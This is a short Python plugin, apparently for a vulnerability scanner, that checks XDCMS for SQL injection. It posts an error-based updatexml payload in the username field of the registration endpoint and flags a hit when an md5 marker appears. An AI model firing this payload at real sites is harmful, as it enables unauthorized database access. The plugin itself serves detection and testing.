#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = LinE
#_PlugName_ = XDCMS SQL injection
#_Function_ = XDCMS SQL注射
#_FileName_ = XDCMS_SQL_injection.py


def assign(service, arg):
    if service == "xdcms":
        return True, arg


def audit(arg):
    import urllib
    target = "index.php?m=member&f=register_save"
    data = {
        "username": "sss' And 1 like(updAtexml(1,concat(0x5e24,(Select concat(md5(123),0x3a,0x3a)),0x5e24),1))#",
        "password": "123456",
        "password2": "123456",
        "fields[truename]": "",
        "fileds[email]": "",
        "submit": " ? ? "
    }
    payload = urllib.urlencode(data)

    code, head, res, errcode, _ = curl.curl('-d %s %s' % (payload, target))
    if code == 200 and "ac59075b964b0715" in res:
            security_hole(_)


def getString(String):
    import re
    Temp = re.search("(?<=<h2>).+(?=</h2>)", String).group(0)
    return Temp

if __name__ == '__main__':
    from dummy import *
    audit(assign('xdcms', 'http://www.example.com')[1])